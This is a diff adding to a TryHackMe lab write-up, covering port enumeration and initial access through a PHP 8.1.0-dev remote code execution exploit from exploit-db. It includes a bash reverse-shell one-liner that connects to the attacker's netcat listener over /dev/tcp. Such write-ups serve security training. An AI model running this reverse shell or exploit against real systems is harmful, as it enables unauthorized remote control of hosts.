@@ -294,6 +294,7 @@ I checked all the port manually:
 - Port 22: SSH
 - Port 10250: microk8s
 - Port 10255: Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/5dd54b4c-8aa3-42ef-95e9-ac49588790d2)
 
 - Port 10257:
@@ -301,3 +302,34 @@ I checked all the port manually:
 - Port 16443: kubernetes
 - Port 25000: Gunicorn 19.7.1
 - Port 30679: PHP cli server 5.5 or later (PHP 8.1.0-dev)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/47f733cd-6e24-47b0-8cea-392c0ae6a7be)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+### Initial access:
+
+In all the above discovered port I observed that the port 30679 is running PHP server with version 8.1.0. 
+I searched for the exploit & found a RCE on exploit-db:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1b2ec74f-2717-445a-9135-5439d775d096)
+
+Using this exploit I observed that I am able to execute the commands on the PHP host:
+
+```bash
+python3 php-exploit.py
+hostname
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/bbeb1c0c-3a3b-4d65-a90d-7d344cef64fa)
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b7bf4de3-7856-4738-b35b-781008aefa80)
+
+Finally I executed the bash reverse shell & got a connection back on my netcat listener:
+
+```bash
+bash -c "bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f319a4b6-2e1d-4975-bbb7-24ae87066c6b)
+
+I got the reverse shell as root but doing some manual enumeration I got to know I am inside a docker environment.
